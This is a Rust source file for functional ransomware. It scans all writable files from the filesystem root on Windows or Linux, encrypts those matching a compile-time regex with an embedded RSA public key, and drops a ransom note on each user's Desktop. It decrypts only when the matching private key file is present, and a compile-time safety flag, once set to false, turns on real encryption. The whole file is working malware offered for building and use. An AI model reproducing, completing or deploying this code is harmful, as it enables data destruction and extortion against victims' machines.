use std::{collections::LinkedList, env, fs, io::Write, path::{Path, PathBuf}};
use base64::{engine::{general_purpose, GeneralPurposeConfig}, Engine};
use regex::Regex;
use rsa::{pkcs1::{DecodeRsaPrivateKey, DecodeRsaPublicKey}, Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
use walkdir::WalkDir;

fn main() {
    // Get vars at compile time:
    let pub_key_hash: &'static str = env!("pubkeyhash");
    let pub_key_str: &'static str = env!("pubkey");
    let ransom_file_name: &'static str = env!("RANSOM_NOTE_FILE_NAME");
    let ransom_file_contents_b64: &'static str = env!("RANSOM_NOTE_CONTENTS_B64");
    let file_filter_b64: &'static str = env!("FILE_ALLOW_FILTER_B64"); // Encrypts on regex match
    let safety: bool = !env!("SAFETY").eq_ignore_ascii_case("false");

    // Decode b64 filter:
    let file_filter_bytes = general_purpose::STANDARD.decode(file_filter_b64).expect("Failed to decode base64 string");
    let file_filter = String::from_utf8(file_filter_bytes).expect("Failed to decode string");

    // Decode b64 ransom note:
    let ransom_file_contents_bytes = general_purpose::STANDARD.decode(ransom_file_contents_b64).expect("Failed to decode base64 string");
    let ransom_file_contents = String::from_utf8(ransom_file_contents_bytes).expect("Failed to decode string");

    // Output decryption hash:
    println!("Pub key hash: {}", pub_key_hash);

    // Set "magic bytes" for encryted files
    let hash_magic_bytes = pub_key_hash.as_bytes();

    // Find all files that we can touch and are allowed according to filter:
    let files = find_modifiable_files(file_filter.as_str());

    // Unwrap pub key:
    let base64_config = GeneralPurposeConfig::new()
        .with_encode_padding(false);
    let decoded_pub_key = general_purpose::GeneralPurpose::new(&base64::alphabet::URL_SAFE, base64_config)
        .decode(pub_key_str)
        .unwrap();
    let pub_key = RsaPublicKey::from_pkcs1_der(&decoded_pub_key).unwrap();

    // See if valid decryption key file exists
    match check_for_key(&files, &pub_key_hash, &pub_key) {
        // Private key not found. Encrypt the files.
        None => {
            // Drop ransom note:
            drop_ransom_note(&ransom_file_contents, &ransom_file_name, &hash_magic_bytes);
            // TODO multi thread
            for file in files{
                // Safety to prevent encryption in development:
                if !safety{
                    // Encrypt the file
                    match encrypt_file(&file, &pub_key, &hash_magic_bytes){
                        Ok(_) => (),
                        Err(e) => {
                            println!("Failed encrypt on {:?}, {}", file, e);
                        }
                    };
                }else{
                    // Print when in safety mode:
                    println!("Safety on. Otherwise {:?} would have been encrypted.", file)
                }
            }
        },
        // Private key found. Decrypt the files.
        Some(priv_key) => {
            for file in files{
                match decrypt_file(&file, &priv_key, &hash_magic_bytes){
                    Ok(_) => (),
                    Err(e) => {
                        println!("Failed decrypt on {:?}, {}", file, e);
                    }
                };
            }
        }
    }
    // TODO listen for key file creation and decrypt if found and valid (currently it will need to be re-run)
}

// Drop the ransom note:
fn drop_ransom_note(note: &str, file_name: &str, hash_magic_bytes: &[u8]){
    // Get all home directories
    let home_dirs = get_user_home_dirs();
    for home_dir in home_dirs {
        // Set drop path
        let mut drop_path = PathBuf::from(&home_dir);
        // Change to Desktop, if the user has one:
        if let Some(desktop_dir) = get_desktop_dir(&home_dir) {
            drop_path = desktop_dir;
        }
        // Add the file name:
        drop_path.push(file_name);

        // Add the magic bytes (so we dont encrypt our own note)
        let formatted_note = format!("\n\n{}", note);
        let note_data = [hash_magic_bytes, formatted_note.as_bytes()].concat();

        // Create and write the file:
        let mut file = match fs::File::create(drop_path){
            Ok(file) => file,
            Err(_) => {
                println!("Failed to create ransom note.");
                return;
            }
        };
        match file.write_all(&note_data){
            Ok(_) => (),
            Err(_) => {
                println!("Failed to write to ransom note.");
            }
        };
    }
}

/// Find user's Desktop directory (if it exists)
fn get_desktop_dir(home_dir: &PathBuf) -> Option<PathBuf> {
    let mut desktop_dir = home_dir.clone();
    desktop_dir.push("Desktop");
    if desktop_dir.exists() {
        Some(desktop_dir)
    } else {
        None
    }
}

/// Find a user's home directory on Linux (not windows)
#[cfg(not(target_os = "windows"))]
fn get_user_home_dirs() -> Vec<PathBuf> {
    let mut home_dirs = Vec::new();
    if let Ok(entries) = fs::read_dir("/home") {
        for entry in entries {
            if let Ok(entry) = entry {
                home_dirs.push(entry.path());
            }
        }
    }
    home_dirs
}

// Function to get all user home directories on Windows
#[cfg(target_os = "windows")]
fn get_user_home_dirs() -> Vec<PathBuf> {
    let mut home_dirs = Vec::new();
    if let Ok(entries) = fs::read_dir("C:\\Users") {
        for entry in entries {
            if let Ok(entry) = entry {
                home_dirs.push(entry.path());
            }
        }
    }
    home_dirs
}

/// Encrypt a file:
fn encrypt_file(file_path: &Path, pub_key: &RsaPublicKey, hash_magic_bytes: &[u8]) -> Result<(), String> { 
    // Read the file:
    let contents = match fs::read(file_path) {
        Ok(val) => val,
        Err(_) => {
            return Err("Error reading file".to_string());
        }
    };

    // Dont re-encrypt files we already encrypted:
    if contents.starts_with(hash_magic_bytes){
        return Ok(());
    }

    // Break into chunks (size of 256-11, where 11 is the padding size)
    let chunks = chunk_bytes(&contents, 256-11);

    // Encrypt the chunks and merge back together
    // Start with magic bytes
    let mut merged: Vec<u8> = hash_magic_bytes.to_vec();
    for chunk in chunks.iter().enumerate() {
        // Encrypt
        let mut rng = rand::thread_rng();
        let new_contents = match pub_key.encrypt(&mut rng, Pkcs1v15Encrypt, chunk.1){
            Ok(val) => val,
            Err(_) => {
                return Err("Error encrypting chunk".to_string());
            }
        };
        // Merge:
        merged = [merged, new_contents].concat();
    }

    // Write the file:
    let mut file = match fs::File::create(file_path){
        Ok(val) => val,
        Err(_) => {
            return Err("Error opening file".to_string());
        }
    };
    match file.write_all(&merged){
        Ok(_) => (),
        Err(_) => {
            return Err("Error opening file".to_string());
        }
    }
    Ok(())
}

/// Decrypt a file:
fn decrypt_file(file_path: &Path, priv_key: &RsaPrivateKey, hash_magic_bytes: &[u8]) -> Result<(), String> {
    // Read the file:
    let contents = match fs::read(file_path){
        Ok(content) => content,
        Err(_) => {
            return Err("Failed to read file".to_string());
        } 
    };

    // Check for and strip the magic bytes
    if contents.starts_with(hash_magic_bytes){
        // Remove magic bytes
        let decrypt_contents = &contents[hash_magic_bytes.len()..];

        // Break into chunks (we need to include the padding here, so max size is key length)
        let chunks = chunk_bytes(&decrypt_contents, 256);

        // Decrypt the chunks and merge back together
        // Start with magic bytes
        let mut merged: Vec<u8> = [].to_vec();
        for chunk in chunks.iter().enumerate() {
            // Decrypt
            let new_contents = match priv_key.decrypt(Pkcs1v15Encrypt, chunk.1){
                Ok(val) => val,
                Err(_) => {
                    return Err("Failed to decrypt chunk".to_string());
                } 
            };
            // Merge:
            merged = [merged, new_contents].concat();
        }

        // Write the file:
        let mut file = match fs::File::create(file_path){
            Ok(file) => file,
            Err(_) => {
                return Err("Failed to open file".to_string());
            } 
        };
        match file.write_all(&merged){
            Ok(_) => (),
            Err(_) => {
                return Err("Failed to write to file".to_string());
            } 
        };
    }
    Ok(())
}

/// Break a file into chunks:
fn chunk_bytes(data: &[u8], chunk_size: usize) -> Vec<&[u8]> {
    data.chunks(chunk_size).collect()
}

/// Find all modifiable files
/// regex_filter: regex on files to exclude.
fn find_modifiable_files(regex_filter: &str) -> LinkedList<PathBuf>{
    // Create a linked list of paths
    let mut target_list: LinkedList<PathBuf> = LinkedList::new();
    // Create regex filter
    let re = Regex::new(regex_filter).unwrap();

    // Determine the root directory:
    let root = if cfg!(windows) {
        Path::new("C:\\")
    } else {
        Path::new("/")
    };
    // Iterate all files:
    for entry in WalkDir::new(root) {
        if let Ok(entry) = entry{
            if let Ok(metadata) = fs::metadata(entry.path()) {
                // Only choose writeable files, not symlinks, not self, and ones that match the regex filter:
                if is_writable(&metadata) && re.is_match(entry.path().to_str().unwrap()) 
                    && !entry.path().eq(&std::env::current_exe().unwrap_or_default()) 
                    && !entry.path().is_symlink() 
                    && entry.path().is_file() {
                    target_list.push_back(PathBuf::from(entry.path()));
                }
            }
        }   
    }
    // Return the list of files to encrypt:
    return target_list;
}

/// Check for a valid decryption key
fn check_for_key(files: &LinkedList<PathBuf>, pub_key_hash: &str, pub_key: &RsaPublicKey) -> Option<RsaPrivateKey>{
    for file in files {
        if file.ends_with(format!("{}-private.key", pub_key_hash)){
            // Load the key
            let contents = match fs::read(file){
                Ok(content) => content,
                Err(_) => {
                    println!("Failed to read key file.");
                    continue;
                }
            };
            let priv_key = match RsaPrivateKey::from_pkcs1_der(&contents){
                Ok(key) => key,
                Err(_) => {
                    println!("Failed to convert private key.");
                    continue;
                } 
            };

            // Test the key
            let mut rng = rand::thread_rng();
            let msg = b"test_encryption";
            let test_msg_cipher = match pub_key.encrypt(&mut rng, Pkcs1v15Encrypt, msg){
                Ok(test_enc) => test_enc,
                Err(_) => {
                    println!("Failed to encrypt test message.");
                    continue;
                } 
            };
            if match priv_key.decrypt(Pkcs1v15Encrypt, &test_msg_cipher){
                Ok(test_dec) => test_dec,
                Err(_) => {
                    println!("Failed to decrypt test message.");
                    continue;
                } 
            } == msg{
                // Return true if it works
                return Some(priv_key);
            }
        }
    }
    // If no key, or failed, return false
    return None;
}

/// permission for writeable files on linux
#[cfg(unix)]
fn is_writable(metadata: &fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o200 != 0
}

/// permission for writeable files on windows
#[cfg(windows)]
fn is_writable(metadata: &fs::Metadata) -> bool {
    use std::os::windows::fs::MetadataExt;
    const FILE_ATTRIBUTE_READONLY: u32 = 0x00000001;
    metadata.file_attributes() & FILE_ATTRIBUTE_READONLY == 0
}
